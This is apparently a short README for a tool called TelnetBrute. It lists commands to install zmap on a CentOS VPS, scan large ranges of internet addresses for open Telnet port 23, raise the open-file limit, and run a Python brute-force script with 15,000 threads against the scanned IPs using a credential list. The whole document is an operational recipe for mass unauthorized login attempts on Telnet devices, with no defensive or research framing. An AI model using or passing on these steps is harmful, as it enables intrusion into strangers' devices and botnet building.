[VPS CentOS 6.9 2GB-RAM] 

- Install zmap

yum update -y 

sh zmap_auto_install.sh

- Scan Telnet Ips

1- zmap -p23 -o mfu.txt -N 25000   OR   zmap -p23 -o mfu.txt -w example.lst

- Bruteforce 

2- ulimit -n 999999

3- python TelnetBrute.py mfu.txt 15000 test.txt




<img src="https://raw.githubusercontent.com/XeljomudoX/TelnetBrute.py/master/lul.png">



